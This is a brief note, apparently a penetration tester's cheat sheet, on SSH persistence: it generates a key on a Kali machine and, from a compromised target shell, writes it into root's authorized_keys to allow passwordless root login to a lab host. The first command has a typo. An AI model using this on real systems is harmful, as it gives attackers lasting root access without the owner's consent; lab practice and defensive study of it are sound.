# SSH persistence passwordless

```text
kali@kali:~$ ssh-keygen

kali@kali:~$ cat:~/.ssh/id_rsa.pub
```

in the target shell type:

```text
mkdir /root/.ssh
echo “rsa public key from kali machine” > /root/.ssh/authorized_keys
```

now login without password:

```text
kali@kali:~$ ssh root@sandbox.local
```

